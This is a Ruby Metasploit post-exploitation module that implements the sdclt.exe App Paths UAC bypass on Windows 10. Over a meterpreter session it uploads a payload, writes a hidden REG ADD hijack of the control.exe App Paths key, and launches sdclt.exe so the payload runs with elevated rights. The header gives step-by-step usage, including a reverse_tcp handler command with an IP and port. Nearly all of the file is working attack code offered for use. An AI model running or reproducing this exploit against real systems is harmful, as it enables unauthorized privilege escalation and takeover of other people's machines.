##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : enigma_AppPath_bypass.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Vuln discover  : enigma0x3 | @mattifestation
# Only works againt: Windows 10
# POC: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths
#
#
#
# [ DESCRIPTION ]
# Bypasses UAC by abusing the App Path key for control.exe
# this post will highlight an alternative method that also doesn’t rely on the
# IFileOperation/DLL hijacking approach. This technique works on Windows 10 build 15031,
# As some of you may know, there are some Microsoft signed binaries that auto-elevate
# due to their manifest. While searching for more of these auto-elevating binaries i came
# across “sdclt.exe” and verified that it auto-elevates due to its manifest
#
# Note: This only works on Windows 10. The manifest for sdclt.exe in Windows 7 has the
# requestedExecutionLevel set to “AsInvoker”, preventing auto-elevation when started
# from medium integrity. It is important to note that this technique does not allow
# for parameters, meaning it requires your payload to be placed on disk someplace.
# If you try to give the binary any parameters (e.g, C:\Windows\System32\cmd.exe /c calc.exe),
# it will interpret the entire string as the lpFile value to the ShellExecuteInfo structure,
# which is then passed over to ShellExecuteEx. Since that value doesn’t exist, it will not execute.
# NOTE: "This module will not work if target UAC level its set to 'Always Notify'"
#
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on        => set SESSION 3
# Input the payload name to be uploaded           => set PAYLOAD_NAME payload.exe
# The destination path were to deploy payload     => set DEPLOY_PATH %temp%
# The full path (local) of payload to be uploaded => set LOCAL_PATH /root/payload.exe
# Check target vulnerability settings/status?     => set CHECK_VULN true
# Delete malicious registry hive keys/values?     => set DEL_REGKEY true
#
#
#
# [ EXPLOITATION ]
# 1º - execute the payload.exe currespondent handler in background
#      msf post(enigma_AppPath_bypass) > handler -p windows/meterpreter/reverse_tcp -H 192.192.1.69 -P 666
# 2º - execute enigma_AppPath_bypass post-module
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/enigma_AppPath_bypass.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/enigma_AppPath_bypass.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/enigma_AppPath_bypass
# msf post(enigma_AppPath_bypass) > info
# msf post(enigma_AppPath_bypass) > show options
# msf post(enigma_AppPath_bypass) > show advanced options
# msf post(enigma_AppPath_bypass) > set [option(s)]
# msf post(enigma_AppPath_bypass) > exploit
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -x 'reload_all'
##




# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'




# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = GreatRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry




# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Abusing the App Path key for control.exe [sdclt.exe]',
                        'Description'   => %q{
                                        Implementation of App Path UAC bypass by enigma0x3 and mattifestation. This module will upload your payload.exe, create the required registry entry in the current user’s hive and runs sdclt.exe (hijacking the process being started to gain code execution). NOTE: this technique does not allow for parameters (e.g, C:\Windows\System32\cmd.exe /c calc.exe). 
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Vuln discover: enigma0x3 | mattifestation', # credits
                                ],
 
                        'Version'        => '$Revision: 1.4',
                        'DisclosureDate' => 'abr 21 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',     # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         [ 'Windows 10' ] # Only works againts Windows 10
                                ],
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',  # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status?' , false]),
                                OptString.new('PAYLOAD_NAME', [ false, 'The payload NAME to be uploaded (eg shell.exe)']),
                                OptString.new('DEPLOY_PATH', [ false, 'The destination were to deploy (eg %temp%)']),
                                OptString.new('LOCAL_PATH', [ false, 'The full path of payload.exe to upload (eg /root/shell.exe)'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry key hive?' , false])
                        ], self.class) 

        end




#
# GAIN REMOTE CODE EXCUTION BY HIJACKING PROCESS
#
def ls_stage1

  r=''
  session = client
  upl_path = datastore['LOCAL_PATH'] # /root/payload.exe
  dep_path = datastore['DEPLOY_PATH'] # %temp%
  pay_name = datastore['PAYLOAD_NAME'] # payload.exe
  uac_level = "ConsentPromptBehaviorAdmin" # uac level registry key
  uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
  regi_hive = "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" # registry hive key to be hijacked
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['DEPLOY_PATH'] == 'nil' || datastore['LOCAL_PATH'] == 'nil' || datastore['PAYLOAD_NAME'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set DEPLOY_PATH | LOCAL_PATH | PAYLOAD_NAME options!")
    return nil
  else
    print_status("Hijacking sdclt.exe process!")
    Rex::sleep(1.5)
  end

    #
    # search in target regedit if binary calls App Paths
    #
    print_warning("Reading process registry hive keys ..")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths")
      print_good(" exec => remote registry hive key found!")
      Rex::sleep(1.0)
    else
      # registry hive key not found, aborting module execution ..
      print_warning("Hive key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion (App Paths)")
      print_error("[ABORT]: module cant find the registry hive key needed ..")
      print_error("System does not appear to be vulnerable to the exploit code!")
      print_line("")
      Rex::sleep(1.0)
      return nil
    end

      #
      # check target UAC settings (always notify - will abort module execution)
      #
      check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
      # a dword:2 value it means 'always notify' setting is active.
      if check_success == 2
        print_warning("Target UAC set to: #{check_success} (always notify)")
        print_error("[ABORT]: module can not work under this condictions ..")
        print_error("Remote system its not vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
      # a dword:nil value it means that we are running againts a 'non-uac-system'
      elsif check_success.nil?
        print_warning("UAC DWORD DATA EMPTY (NON-UAC-SYSTEM?)")
        print_error("[ABORT]: module can not work under this condictions ..")
        print_error("Remote system its not vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
      else
        # all good in UAC settings :D
        print_good(" exec => Target UAC set to: #{check_success} (exploitable)")
        Rex::sleep(1.0)
      end

        #
        # Upload our executable into target system ..
        # And config registry key injection (hijack) ..
        #
        print_good(" exec => Uploading: #{pay_name} agent ..")
        client.fs.file.upload("#{dep_path}\\#{pay_name}","#{upl_path}")
        sleep(1.0)
        comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{dep_path}\\#{pay_name}\" /f"
        print_good(" exec => Placing hijack registry key ..")
        Rex::sleep(1.0)


 # Execute process hijacking in registry ..
 # REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /ve /t REG_SZ /d %temp%\\payload.exe /f
 print_good(" exec => Hijacking process to gain code execution ..")
 r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit 'enigma0x3' :D
 Rex::sleep(4.5)

      # start remote service to gain code execution
      print_good(" exec => Starting sdclt.exe native process ..")
      r = session.sys.process.execute("cmd.exe /c start sdclt.exe", nil, {'Hidden' => true, 'Channelized' => true})
      Rex::sleep(0.5)

    # close channel when done
    print_status("UAC-RCE Credits: enigma0x3 + @mattifestation")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




#
# DELETE MALICIOUS REGISTRY ENTRY (process hijacking)
# This funtion returns control.exe reg key to is default value ..
#
def ls_stage2

  r=''
  session = client
  value = "/ve /t REG_SZ /f" # registry key default value ..
  reg_clean = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" # registry hive to be cleaned ..
  # 
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['DEL_REGKEY'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set DEL_REGKEY option!")
    return nil
  else
    print_status("Revert sdclt.exe process hijack!")
    Rex::sleep(1.5)
  end

    #
    # Search in target regedit if hijacking method allready exists ..
    #
    print_warning("Reading process registry hive keys ..")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe")
      print_good(" exec => Remote registry hive key found!")
      Rex::sleep(1.0)
    else
       # registry hive key not found, aborting module execution.
       print_warning("Hive key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths")
       print_error("[ABORT]: module cant find the registry hive key needed ..")
       print_line("")
       Rex::sleep(1.0)
       return nil
    end

      #
      # Revert hijacking registry key from target regedit ..
      #
      print_good(" exec => Reverting control.exe hijack reg key ..")
      r = session.sys.process.execute("cmd.exe /c REG ADD \"#{reg_clean}\" #{value}", nil, {'Hidden' => true, 'Channelized' => true})
      print_good(" exec => cmd.exe /c REG ADD \"#{reg_clean}\" #{value}")
      # give a proper time to refresh regedit
      Rex::sleep(3.0)

    # close channel when done
    print_status("process hijack reverted to default stage!")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




#
# CHECK TARGET VULNERABILITY STATUS/EXISTANCE
#
def ls_stage3

  r=''
  session = client
  oscheck = client.fs.file.expand_path("%OS%")
  uac_level = "ConsentPromptBehaviorAdmin" # uac level key
  uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
  vuln_stats = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" # hijacking reg key
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['CHECK_VULN'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set CHECK_VULN option!")
    return nil
  else
    print_status("Checking target vulnerability details!")
    Rex::sleep(1.5)
  end

    #
    # Check target registry hive/key existence ..
    #
    print_warning("Reading process registry hive keys ..")
    Rex::sleep(2.0)
    if registry_enumkeys("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe")
      report_tw = "VULNERABLE (hive key found)"
    else
      report_tw = "NOT VULNERABLE (hive not found)"
    end

      #
      # check target registry hive/key settings (UAC level settings)
      #
      check_uac = registry_getvaldata("#{uac_hivek}","#{uac_level}")
      # a dword:2 value it means 'always notify' setting is active.
      if check_uac == 2
        report_level = "ALWAYS NOTIFY (NOT EXPLOITABLE)"
      # a dword:nil value it means that we are running againts a 'non-uac-system'
      elsif check_uac.nil?
        report_level = "DWORD DATA EMPTY (NON-UAC-SYSTEM?)"
      else
        # all good in UAC settings :D
        report_level = "#{check_uac} (EXPLOITABLE)"
      end

    #
    # Checks for target OS compatiblity.
    #
    if oscheck.nil?
      oscheck = "NOT COMPATIBLE SYSTEM"
    end

  #
  # display target registry settings to user ..
  # i hope you are smart enouth to recognise a vulnerable output :D
  #
  print_line("")
  print_line("VULNERABLE_SOFT : sdclt.exe")
  print_line("    TARGET_OS   : #{oscheck}")
  print_line("    UAC_LEVEL   : #{report_level}")
  print_line("")
  print_line("    HIJACK_HIVE : #{vuln_stats}")
  print_line("    VULN_STATUS : #{report_tw}")
  print_line("")
  print_line("")
  Rex::sleep(1.0)
end




#
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
#
def run
  session = client

      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +----------------------------------------------+")
    print_line("    |   enigma fileless UAC bypass 'control.exe'   |")
    print_line("    |            Author : r00t-3xp10it             |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    #
    # check for proper operative system (windows 10)
    #
    if not sysinfo['OS'] =~ /Windows 10/
      print_error("[ ABORT ]: This module only works againt windows 10 systems")
      return nil
    end
    #
    # check for proper session (meterpreter) the non-return of sysinfo
    # command reveals that we are not on a meterpreter session ..
    #
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module only works in meterpreter sessions!")
      return nil
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['DEPLOY_PATH']
         ls_stage1
      end

      if datastore['DEL_REGKEY']
         ls_stage2
      end

      if datastore['CHECK_VULN']
         ls_stage3
      end
   end
end
